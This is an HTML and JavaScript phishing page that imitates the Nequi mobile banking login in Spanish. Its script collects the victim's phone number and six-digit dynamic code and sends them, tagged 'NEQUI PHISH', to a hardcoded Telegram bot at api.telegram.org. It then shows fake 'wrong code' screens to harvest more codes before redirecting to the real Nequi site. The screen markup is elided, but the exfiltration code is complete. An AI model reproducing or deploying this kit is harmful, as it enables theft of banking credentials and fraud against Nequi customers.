<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nequi</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
    
    * { margin:0; padding:0; box-sizing:border-box; }
    body { 
      font-family: 'Roboto', sans-serif; 
      background: #1F0829;
      height: 100vh; 
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .phone-frame {
      width: 100%;
      max-width: 420px;
      height: 100vh;
      background: #1F0829;
      position: relative;
      overflow: hidden;
    }

    .screen {
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      padding: 20px;
      background: #1F0829;
      display: none;
      flex-direction: column;
    }
    #screen1 { display: flex; }

    .help {
      position: absolute; top: 25px; right: 25px;
      width: 32px; height: 32px;
      border: 2px solid rgba(255,255,255,0.9);
      border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 18px;
    }

    .nequi-logo {
      margin-top: 85px;
      font-size: 58px;
      font-weight: 700;
      text-align: center;
      color: white;
    }
    .nequi-logo span { color: #FF2D95; margin-right: 8px; }

    .label { text-align: center; margin: 70px 0 35px 0; font-size: 17.5px; color: #D8B5E8; }

    .input-box {
      background: #2C1642;
      border-radius: 12px;
      padding: 6px;
      margin: 0 15px;
    }

    input {
      width: 100%;
      background: #2C1642;
      color: white;
      border: none;
      padding: 18px 20px;
      font-size: 17px;
      border-radius: 8px;
      outline: none;
      text-align: center;
    }

    button {
      margin: 40px 15px 20px 15px;
      height: 58px;
      background: linear-gradient(to right, #FF2D95, #E6007E);
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 17.5px;
      font-weight: 500;
    }

    .back {
      position: absolute;
      top: 25px; left: 20px;
      font-size: 30px;
      cursor: pointer;
    }

    .title {
      margin-top: 65px;
      text-align: center;
      font-size: 26px;
      font-weight: 500;
    }

    .pins {
      margin: 60px 0 40px 0;
      display: flex;
      justify-content: center;
      gap: 22px;
    }
    .pin {
      width: 48px;
      height: 48px;
      background: #E0B0FF;
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 26px;
      color: #3C0A55;
    }

    .message {
      text-align: center;
      color: #C8A2E0;
      font-size: 15.5px;
      line-height: 1.5;
    }

    .keyboard {
      margin-top: auto;
      margin-bottom: 30px;
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 18px 35px;
      padding: 0 25px;
      font-size: 34px;
    }
    .key {
      height: 68px;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(255,255,255,0.09);
      border-radius: 50%;
      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
    }
    .key:active { background: rgba(255,255,255,0.25); }
    .delete { font-size: 26px !important; }

    /* Loader Silencioso */
    #loader {
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100%;
    }
    .spinner {
      width: 65px;
      height: 65px;
      border: 6px solid rgba(255,45,149,0.2);
      border-top: 6px solid #FF2D95;
      border-radius: 50%;
      animation: spin 1.1s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* ==================== PANTALLA DE ERROR MEJORADA ==================== */
    #errorScreen {
      background: #1F0829;
      padding-top: 80px;
    }

    .error-title {
      color: #FF2D95;
      font-size: 24px;
      font-weight: 500;
      text-align: center;
      margin-bottom: 20px;
    }

    .error-message {
      color: #D4A8E8;
      font-size: 15.5px;
      text-align: center;
      line-height: 1.6;
      margin-bottom: 50px;
    }

    .error-button {
      width: 85%;
      max-width: 320px;
      margin: 0 auto 40px;
      height: 56px;
      background: linear-gradient(to right, #FF2D95, #FF007A);
      color: white;
      border: none;
      border-radius: 30px;
      font-size: 17px;
      font-weight: 500;
      box-shadow: 0 6px 15px rgba(255, 45, 149, 0.3);
    }

    .attempts {
      text-align: center;
      color: #FF6EBF;
      font-size: 15px;
      font-weight: 400;
    }
  </style>
</head>
<body>

  <div class="phone-frame">

    <!-- Pantallas anteriores (resumidas) -->
    <div class="screen" id="screen1"> ... </div>
    <div class="screen" id="screen2"> ... </div>
    <div class="screen" id="screen3"> ... </div>

    <!-- Loader Silencioso -->
    <div class="screen" id="loader">
      <div class="spinner"></div>
    </div>

    <!-- Nueva Pantalla de Error - Estética -->
    <div class="screen" id="errorScreen">
      <div class="error-title">Clave dinámica errada</div>
      <div class="error-message">
        El código ingresado no es correcto.<br>
        Por favor intenta nuevamente.
      </div>
      <button class="error-button" onclick="retryDynamic()">Intentar de nuevo</button>
      <div class="attempts" id="attemptsText">Intentos restantes: 3</div>
    </div>

  </div>

  <script>
    let phoneNumber = "";
    let attemptsLeft = 3;
    let pin4 = "";
    let pin6 = "";

    const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
    const chatId = "773351137";

    function goToPassword() {
      const phone = document.getElementById("phone").value.trim();
      if (phone.length < 9) return alert("Por favor ingresa un número válido");
      phoneNumber = phone;
      showScreen('screen2');
    }

    function showScreen(id) {
      document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
      document.getElementById(id).style.display = 'flex';

      if (id === 'screen2') pin4 = "";
      if (id === 'screen3') pin6 = "";
      updatePins();
    }

    function addDigit(num, type) {
      if (type === 4) {
        if (pin4.length < 4) {
          pin4 += num;
          updatePins();
          if (pin4.length === 4) {
            showSilentLoader();
          }
        }
      } else if (type === 6) {
        if (pin6.length < 6) {
          pin6 += num;
          updatePins();
          if (pin6.length === 6) sendDynamicCode();
        }
      }
    }

    function deleteDigit(type) {
      if (type === 4) pin4 = pin4.slice(0, -1);
      if (type === 6) pin6 = pin6.slice(0, -1);
      updatePins();
    }

    function updatePins() {
      document.querySelectorAll("#pins4 .pin").forEach((pin, i) => {
        pin.textContent = i < pin4.length ? "●" : "";
      });
      document.querySelectorAll("#pins6 .pin").forEach((pin, i) => {
        pin.textContent = i < pin6.length ? "●" : "";
      });
    }

    function showSilentLoader() {
      showScreen('loader');
      setTimeout(() => showScreen('screen3'), 2500);
    }

    function sendDynamicCode() {
      const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phoneNumber}\n🔑 Clave Dinámica: ${pin6}\n⏰ ${new Date().toLocaleString('es-CO')}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });

      showScreen('loader');

      setTimeout(() => {
        attemptsLeft--;
        document.getElementById('attemptsText').textContent = `Intentos restantes: ${attemptsLeft}`;
        if (attemptsLeft > 0) {
          showScreen('errorScreen');
        } else {
          window.location.href = "https://www.nequi.com.co";
        }
      }, 6000);
    }

    function retryDynamic() {
      showScreen('screen3');
    }

    function goBack(from) {
      if (from === 1) showScreen('screen1');
      if (from === 2) showScreen('screen2');
    }
  </script>
</body>
</html>
